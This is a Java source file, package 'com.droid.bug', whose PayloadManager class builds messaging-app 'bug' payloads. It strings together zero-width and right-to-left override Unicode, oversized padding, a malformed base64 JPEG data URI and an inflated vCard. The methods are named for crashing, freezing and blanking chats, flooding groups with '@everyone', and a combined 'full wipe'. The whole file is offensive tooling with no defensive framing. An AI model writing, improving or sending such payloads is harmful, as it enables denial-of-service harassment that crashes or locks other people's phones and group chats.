package com.droid.bug;

public class PayloadManager {

    // Crash payloads (zero-width + special unicode + oversize)
    public String getCrashPayload() {
        return "‎‏‏‎ ‎" + 
               "\u200B\u200C\u200D\u2060\u2061\u2062\u2063\u2064" +
               generateOverflow(8000) +
               "\u202E\u202D\u202C" +
               "‎";
    }

    public String getFreezePayload() {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 300; i++) {
            sb.append("\u200B\u200C\u200D\u2060");
            sb.append("⁧⁧⁧");
            sb.append(generateOverflow(120));
        }
        return sb.toString();
    }

    public String getBlankPayload() {
        return "\u200E\u200F\u202A\u202B\u202C\u202D\u202E" +
               "\u2066\u2067\u2068\u2069" +
               "\uFEFF\u00AD\u034F";
    }

    public String getMediaCrashPayload() {
        return "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAn/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAAGcP/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAQUCf//EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQMBAT8Bf//EABQRAQAAAAAAAAAAAAAAAAAAAAD/AAAAD/2gAIAQIBAT8Bf//Z" +
               generateOverflow(4000);
    }

    public String getStatusBugPayload() {
        return "Status‎‏‎ ‎Bug\u200B" + generateOverflow(5000) + "\u202E";
    }

    public String getGroupDestroyPayload() {
        StringBuilder sb = new StringBuilder();
        sb.append("@everyone ");
        for (int i = 0; i < 50; i++) {
            sb.append(getCrashPayload().substring(0, 200));
            sb.append("\n");
        }
        return sb.toString();
    }

    public String getContactSpamPayload() {
        return "BEGIN:VCARD\nVERSION:3.0\nN:;" + generateOverflow(3000) + ";;;\nFN:" + 
               generateOverflow(2000) + "\nTEL;TYPE=CELL:0000000000\nEND:VCARD";
    }

    public String getTypingLoopPayload() {
        return "\u200B".repeat(5000) + "typing...";
    }

    public String getLastSeenPayload() {
        return "‎" + "\u2060".repeat(10000);
    }

    public String getFullWipePayload() {
        return getCrashPayload() + "\n" +
               getFreezePayload() + "\n" +
               getBlankPayload() + "\n" +
               getMediaCrashPayload();
    }

    private String generateOverflow(int size) {
        StringBuilder sb = new StringBuilder(size);
        String chunk = "A".repeat(100) + "\u200B\u200C\u200D";
        while (sb.length() < size) {
            sb.append(chunk);
        }
        return sb.substring(0, size);
    }
}